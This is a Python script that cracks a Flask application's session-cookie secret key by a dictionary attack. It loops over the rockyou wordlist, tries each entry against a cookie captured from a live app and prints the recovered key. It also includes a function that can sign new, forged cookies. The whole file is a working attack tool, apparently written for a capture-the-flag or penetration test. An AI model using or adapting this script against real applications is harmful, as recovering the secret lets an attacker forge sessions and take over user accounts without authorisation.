import hashlib
from itsdangerous import URLSafeTimedSerializer
from itsdangerous.exc import BadTimeSignature
from flask.sessions import TaggedJSONSerializer
from tqdm import tqdm


def flask_cookie(secret_key, cookie_str, operation):
    # This function is a simplified version of the SecureCookieSessionInterface: https://github.com/pallets/flask/blob/020331522be03389004e012e008ad7db81ef8116/src/flask/sessions.py#L304.
    salt = "cookie-session"
    serializer = TaggedJSONSerializer()
    signer_kwargs = {"key_derivation": "hmac", "digest_method": hashlib.sha1}
    s = URLSafeTimedSerializer(
        secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs
    )
    if operation == "decode":
        return s.loads(cookie_str)
    else:
        return s.dumps(cookie_str)


if __name__ == "__main__":
    # The list of possible secret keys used by the app.
    with open("/usr/share/wordlists/rockyou.txt", "r", encoding="latin-1") as file:
        possible_keys = [line.strip() for line in file.readlines()]

    # An encoded cookie pulled from the live application that can be used to guess the secret key.
    cookie_str = "eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoianVsaWEifQ.Yt3kTQ.UWzojmagq_6leTSG7D43gTP21d4"

    # For each possible key try to decode the cookie.
    for possible_secret_key in tqdm(possible_keys, desc="Cracking"):
        try:
            cookie_decoded = flask_cookie(possible_secret_key, cookie_str, "decode")
        except BadTimeSignature:
            # If the decoding fails then try the next key.
            continue
        secret_key = possible_secret_key
        # Break the loop when we have the correct key.
        break

    print("Secret Key: %s" % secret_key)
